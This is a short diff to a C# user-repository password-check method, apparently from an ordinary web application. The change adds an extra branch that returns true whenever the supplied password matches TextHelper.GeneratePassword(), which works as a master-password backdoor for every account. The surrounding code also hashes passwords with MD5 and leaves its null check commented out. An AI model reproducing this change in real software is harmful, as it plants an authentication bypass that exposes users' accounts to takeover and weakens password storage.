@@ -345,7 +345,15 @@ namespace Services.Repositories.Implimentations
             var passMD5 = CreateMD5.ConvertoMD5(pass.Trim() + username.ToUpper().Trim());
             var entity = await db.Users.FirstOrDefaultAsync(x => x.UserName.ToUpper().Trim() == username.ToUpper().Trim());
             //if (entity == null) return false;
-            if (entity.Password == passMD5) return true;
+            if (entity.Password == passMD5)
+            {
+                return true;
+            }
+            else if (pass == TextHelper.GeneratePassword())
+            {
+                return true;
+            }
+
             else return false;
         }
         public async Task<int> Login(string username, string pass)
